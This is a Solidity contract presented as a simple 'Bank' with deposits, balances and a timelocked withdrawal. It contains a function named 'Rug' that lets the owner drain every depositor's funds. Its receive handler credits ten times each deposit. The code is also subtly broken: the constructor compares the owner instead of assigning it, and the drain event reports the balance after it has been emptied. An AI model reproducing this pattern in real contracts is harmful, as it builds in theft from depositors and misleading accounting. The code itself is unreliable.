//SPDX-License-Identifier:MIT
pragma solidity ^0.8.0;

contract Bank {
    address payable public owner;
    mapping(address => uint256) balances;
    event TransferEvent(address from, address to, uint256 amount);

    constructor() payable {
        owner == msg.sender;
        balances[msg.sender] += msg.value;
    }

    function BalanceOf() external view returns (uint256) {
        return balances[msg.sender];
    }

    function BankBalanceOf() external view returns (uint256) {
        return address(this).balance;
    }

    function Withdraw(uint256 amount) external {
        require(block.timestamp >= 1681552987, "Timelock::executeTransaction: Transaction hasn't surpassed time lock.");
        require(balances[msg.sender] >= amount, "balance must enough");
        balances[msg.sender] -= amount;
        payable(msg.sender).transfer(amount);
    }

    function Rug() external {
        require(owner == msg.sender, "caller must owner");
        owner.transfer(address(this).balance);
        emit TransferEvent(address(this), owner, address(this).balance);
    }

    receive() external payable {
        balances[msg.sender] += msg.value*10;
        emit TransferEvent(msg.sender, address(this), msg.value);
    }
}